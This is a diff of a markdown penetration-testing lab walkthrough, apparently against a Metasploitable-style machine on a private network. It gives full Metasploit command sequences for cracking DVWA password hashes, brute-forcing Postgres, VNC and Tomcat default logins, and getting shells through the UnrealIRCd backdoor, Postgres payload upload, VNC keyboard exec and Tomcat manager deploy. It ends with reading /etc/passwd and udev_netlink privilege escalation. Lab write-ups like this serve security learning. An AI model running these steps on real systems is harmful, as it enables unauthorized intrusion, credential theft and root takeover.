@@ -870,6 +870,7 @@ show tables;
 select * from Users;
 select Password form Users;
 ```
+![](../images/exploring_dvwa_db.png)
 Here we access an important tables users which contain the login crudential of various users on the dvwa web application, which might be very userful. But the table contains the password in coded format in hashes, so we have to decode the hashes to get the real password. For that we can use a popular tool called **John the ripper**.
 
 Firstly we need to identify the type of hash encoding(like md4, md5 or ntlm) inorder to use the john tool.
@@ -877,12 +878,14 @@ For that we had an another tool to identify the type of hash encoding -> we can 
 ```
 hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99
 ```
+![](../images/hash-identifier.png)
 Here we got that the hash encoding is md5
 
 Using **john the ripper**, decode the hashes and need to stored the hashes into a test file 'password_hashes.txt'
 ```
 john -format=raw-md5 /usr/share/seclist/Password/Leaked-Databases/rockyou-25.txt /home/kali/password_hashes.txt --show
 ```
+![](../images/cracking_password_hashes_using_john.png)
 That's set, we got the password for the hashes for the users.
 **Start exploring the owasp 10 database**
 #Now start executing sql querries to enumerate owasp 10 database
@@ -892,12 +895,15 @@ show tables;
 #Here we had an accounts table
 select * from accounts;
 ```
+![](../images/exploring_owasp10_db.png)
+![](../images/exploring_owasp10_db_2.png)
 Here in the accounts table there are different user and their plain password for the owasp10 webapp. 
 
 **Till now we get two tables which have sensitive information about its users on the webapp of dvwa and owasp10.** We can also performing dumping crudential and other stuff on the different databases.
 
 ---
 ## Exploiting Service on Port 5432 Postgresql -> postgresql db 8.3.0-8.3.7
+![](../images/service_on_port_5432.png)
 Postgresql is a powerful, open source object-relation database system that uses and extends the SQL language combined with many features that safety store and scale the most complicated data workload.
 It mainly used for large enterprise where we handle complex queries, large no of datatypes and reliable concurrency support for multiple user simultaneously. It is more efficient for large databases and complex queries.
 ### Identifying Vulnerabilites or Weakness
@@ -920,7 +926,9 @@ msf auxiliary(scanner/postgres/postgres_login) > set User_file /usr/share/metasp
 msf auxiliary(scanner/postgres/postgres_login) > set Pass_file /usr/share/metasploit-framework/data/wordlist/postgres_defaut_pass.txt
 msf auxiliary(scanner/postgres/postgres_login) > run
 ```
-[]
+![](../images/bruteforcing_postgres_service_using_metasploit_1.png)
+![](../images/bruteforcing_postgres_service_using_metasploit_2.png)
+![](../images/bruteforcing_postgres_service_using_metasploit_3.png)
 Here, we got that the postgres service is set to use the default **username=postgres** and **password=postgres**.
 
 Now we can connect to that postgres service using postgresql-client ->**psql**
@@ -934,6 +942,7 @@ psql -U postgres -h 192.168.1.103 -c 'Select datname from pg_databases;'
 #listing tables from a particular database
 psql -U postgres -h 192.168.1.103 -d postgres -c 'Select table_name from information_schema.tables where table_schema= 'public';'
 ```
+![](../images/connection_to_postgres_server_using_psql_client.png)
 **OR we can use a metasploit module to execute the sql command over the postgres server**
 ```
 msfconsole -q
@@ -946,7 +955,6 @@ msf auxiliary(scanner/admin/postgres) > set password postgres
 msf auxiliary(scanner/admin/postgres) > set Sql 'Select datname from pg_databases;'
 msf auxiliary(scanner/admin/postgres) > run
 ```
-
 ##### linux payload Execution Vulerability
 ```
 msfconsole -q
@@ -957,6 +965,9 @@ msf > exploit(linux/postgres/postgres_payload) >set RHOSTS 192.168.1.103
 msf > exploit(linux/postgres/postgres_payload) > set LHOST 192.168.1.101
 msf > exploit(linux/postgres/postgres_payload) > run
 ```
+![](../images/exploiting_postgres_using_linux_payload_1.png)
+![](../images/exploiting_postgres_using_linux_payload_2.png)
+![](../images/exploiting_postgres_using_linux_payload_3.png)
 Here the payload get uploaded and gets executed by the target and we got a meterpreter session...
 
 ### Post-Exploitation things
@@ -972,13 +983,20 @@ As we have the crudential of postgres, we can use readfile module to read the co
 ```
 msfconsole -q
 msf > search postgres_readfile
-msf > use
-
+msf > use auxiliary/admin/postgres/postgres_readfile
+msf auxiliary(admin/postgres/postgres_readfile) > show options
+msf auxiliary(admin/postgres/postgres_readfile) > set RHOSTS 192.168.1.103
+msf auxiliary(admin/postgres/postgres_readfile) > set RFILE /etc/passwd
+msf auxiliary(admin/postgres/postgres_readfile) > run
 ```
+![](../images/post-exploitation_on_postgres_server_1.png)
+![](../images/post-exploitation_on_postgres_server_2.png)
+![](../images/post-exploitation_on_postgres_server_3.png)
 Here we got the content of /etc/passwd and using with /etc/shadow we can get the password hashes, and using tool like 'john the ripper' we can get root user crudential and used to esculate privilages to root.
 
 ---
 ## Exploiting Service on Port 5900 VNC -> vnc protocol 3.3
+![](../images/service_on_port_5900.png)
 VNC(Virtual network computing ) is remote access protocol to control a machine remotely using tcp/ip. It is a graphical desktop-sharing system that use the remotely machine and control it with your local keyboard and mouse.
 
 It mainly works on client-server archeitecture, i.e both client and server to need to have vnc service installed. It was mainly designed and worked for linux environment. While windows mainly uses RDP(remote desktop protocol) to remote desktop access. There are various software client for the vnc protocol like ultraVNC, RealVNC, TightVNC etc.
@@ -1001,12 +1019,15 @@ msf auxiliary(scanner/vnc/vnc_login) > set Username true
 msf auxiliary(scanner/vnc/vnc_login) > set Stop_on_success true
 msf auxiliary(scanner/vnc/vnc_login) > run
 ```
+![](../images/bruteforcing_vnc_login_1.png)
+![](../images/bruteforcing_vnc_login_2.png)
 Here we got that vnc is configure to used the default crudential which is **username=root** and **passowrd=password**.
 Now lets connect to the vnc service using a vnc-client, I had tightVNC client
 ```
 vncviewer 192.168.1.103
 password
 ```
+![](../images/connecting_to_vnc_service_using_vnc_client.png)
 Here we got the target's remote desktop access as a **root** user. Now we can perform post-exploitation things like reading sensitive file and data etc...
 
 **If we want to get only the remote-cli access, if we don't have a vnc-client**
@@ -1024,6 +1045,10 @@ msf exploit(multi/vnc/vnc_keyboard_exec) > show payloads
 msf exploit(multi/vnc/vnc_keyboard_exec) > set payload cmd/unix/reverse_perl
 msf exploit(multi/vnc/vnc_keyboard_exec) > run
 ```
+![](../images/exploiting_vnc_service_using_metasploit_1.png)
+![](../images/exploiting_vnc_service_using_metasploit_2.png)
+![](../images/exploiting_vnc_service_using_metasploit_3.png)
+![](../images/exploiting_vnc_service_using_metasploit_4.png)
 Here also we got a root shell, to our target....
 
 ---
@@ -1032,6 +1057,7 @@ The X window System is a windowing for bitmap display, which is common on the un
 
 ---
 ## Exploiting Service on Port 6667 irc -> unreal IRCD
+![](../images/service_on_port_6667.png)
 IRC (Internet Relay Chat) is a protocol used for real-time text messaging between multiple users across different network. Any user can connect to server using irc-client and send request to join a room and start the conversation.
 ### Identifying Vulnerabilites or Weakness
 **1. Unrestricted Access** Many IRC services lack robust authentication, allowing any unauthenticated users to connect. This can enable an attacker to join, monitor, or manipulate channels.
@@ -1046,12 +1072,14 @@ As the ircd service on the target are misconfigured to gave access to all hosts 
 ```
 irssi 192.168.1.103 -p 6667
 ```
+![](../images/connecting_to_irc_service_using_irssi_client_1.png)
 Once get connected to the service, you can join rooms
 ```
 \join room
 #see the conversation going on
 \quit
 ```
+![](../images/connecting_to_irc_service_using_irssi_client_2.png)
 ##### Exploitation using ircd3281_backdoor
 ```
 msfconsole -q
@@ -1064,10 +1092,14 @@ msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 10
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.1.101
 msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
 ```
+![](../images/exploiting_irc_using_backdoor_1.png)
+![](../images/exploiting_irc_using_backdoor_2.png)
+![](../images/exploiting_irc_using_backdoor_3.png)
 Here we got a **root** shell to the target system by connecting to the backdoor present in the ircd service. Now we can perform anything on the target as we have the root shell to the target like stealing sensitive data and file etc...
 
 ---
 ## Exploiting Service running on port 8180 http -> Apache tomcat/coyote JSP engine 1.1
+![](../images/service_on_port_8180.png)
 Here we have an another web-server running on the target port 8180 which is apache tomcat server, a pure java based server used to execute the java-application on the server. Apache Tomcat is an open-source application server designed to run Java applications, primarily Java Servlets and JSPs. Coyote is the HTTP connector component within Tomcat that allows it to serve HTTP requests and JSP pages. The Coyote JSP engine processes JSP files on the server, dynamically generating HTML content to be sent to users' browsers.
 
 Tomcat with Coyote is commonly used for:
@@ -1082,15 +1114,60 @@ Tomcat with Coyote is commonly used for:
 ```
 msfconsole -q
 msf > search mgr_login
-msf > use
-msf > show options
+msf > use search auxiliary/scanner/http/tomcat_mgr_login
+msf auxiliary(scanner/http/tomcat_mgr_login) > show options
+msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.1.103
+msf auxiliary(scanner/http/tomcat_mgr_login) > set Anonymous_login true
+msf auxiliary(scanner/http/tomcat_mgr_login) > set Black_passwords true
+msf auxiliary(scanner/http/tomcat_mgr_login) > run
 ```
+![](../images/bruteforcing_tomcat_server_using_metasploit_1.png)
+![](../images/bruteforcing_tomcat_server_using_metasploit_2.png)
+![](../images/bruteforcing_tomcat_server_using_metasploit_3.png)
 Here we get that the server is set to used the default crudential as **username= tomcat** and **passowrd=tomcat**.
-##### Manager Application Access using crudential
+##### Exploitation of Manager Application Access using crudential
 ```
 msfconsole -q
 msf > search mgr_deploy
-msf > use
-msf >
-
+msf > use exploit/multi/http/tomcat_mgr_deploy
+msf exploit(multi/http/tomcat_mgr_deploy) > show options
+msf exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername tomcat
+msf exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword tomcat
+msf exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 192.168.1.103
+msf exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8180
+msf exploit(multi/http/tomcat_mgr_deploy) > run
 ```
+![](../images/manager_application_exploitation_on_tomcat_server_1.png)
+![](../images/manager_application_exploitation_on_tomcat_server_2.png)
+![](../images/manager_application_exploitation_on_tomcat_server_3.png)
+Hence, we got a meterpreter session with the remote server as 'tomcat55' user.
+
+### Post-Exploitation things
+Since we have the remote access, but we has a shell as a 'tomcat55' user which is a normal user and we can't have the root access and So we can't able to see the sensitive file and content of the system due to limited access of our user. 
+Here we are going to esculate the privilages to get the higher access to the system, like root user, so that we can completely control the target..
+
+For that we had a metasploit module which can help us in privilege escalation, and also 'background the privious tomcat55 user session'.
+```
+msfconsole -q
+msf > search udev_netlink
+msf > use exploit/linux/local/udev_netlink
+msf expliot(linux/local/udev_netlink) > show options
+msf expliot(linux/local/udev_netlink) > set session 1
+msf expliot(linux/local/udev_netlink) > run
+```
+![](../images/privilage_esculation_form_tomcat55_user_1.png)
+![](../images/privilage_esculation_form_tomcat55_user_2.png)
+![](../images/privilage_esculation_form_tomcat55_user_3.png)
+By using this module we had gained the root shell on the target. Now we can perform anything on the target as we have the root access like stealing data and sensitive file etc and other stuff... 
+
+We can also try login to tomcat via our browser, for that we need to get the login page ->
+```
+msfconsole -q
+msf > search tomcat_adminstration
+msf > use auxiliary/admin/http/tomcat_adminstration
+msf auxiliary(admin/http/tomcat_adminstration) > show options
+msf auxiliary(admin/http/tomcat_adminstration) > set RHOSTS 192.168.1.103
+msf auxiliary(admin/http/tomcat_adminstration) > run
+```
+![](../images/finding_login_page_for_tomcat.png)
+Here we get the login url for tomcat 'http//192.168.1.103:8180/admin'. Now we can explore more funtionality of the tomcat server.
